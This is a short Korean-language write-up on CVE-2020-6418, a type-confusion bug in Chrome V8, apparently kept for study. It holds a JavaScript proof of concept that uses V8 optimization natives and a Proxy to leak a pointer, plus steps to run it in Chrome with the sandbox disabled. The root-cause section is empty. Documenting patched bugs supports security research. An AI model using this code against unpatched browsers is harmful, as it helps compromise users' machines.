# Incorrect side effect modelling for JSCreate in V8

## Information
- CVE : CVE-2020-6418
- 해당 소프트웨어 : Chrome V8
- 해당 버전 : Google Chrome prior to 80.0.3987.122
- 취약점 유형 : TypeConfusion

## Root Cause
TBD

## PoC
```javascript
const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(8);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

let a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

function empty() {}

function f(p) {
  return a.pop(Reflect.construct(empty, arguments, p));
}

let p = new Proxy(Object, {
    get: () => {
        //%DebugPrint(a);
        //%SystemBreak();
        a[0] = {};
        //%DebugPrint(a);
        //%SystemBreak();
        return Object.prototype;
    }
});

function main(p) {
  return f(p);
}

%PrepareFunctionForOptimization(empty);
%PrepareFunctionForOptimization(f);
%PrepareFunctionForOptimization(main);

main(empty);
main(empty);
%OptimizeFunctionOnNextCall(main);
print(hex(f2i(main(p))));
```

## How to run exploit?
> OS : Ubuntu 18.04 64bit
> 
> Chrome version : Google Chrome prior to 80.0.3987.122
1) --no-sandbox 옵션으로 크롬 실행
2) exp.js 파일을 로드

## Reference
- [Chrome Bug Tracker](https://bugs.chromium.org/p/chromium/issues/detail?id=1053604)
- [ray-cp github](https://github.com/ray-cp/browser_pwn/tree/master/cve-2020-6418)
- [ray-cp blog](https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
- [V8 patch code](https://chromium.googlesource.com/v8/v8/+/fb0a60e15695466621cf65932f9152935d859447)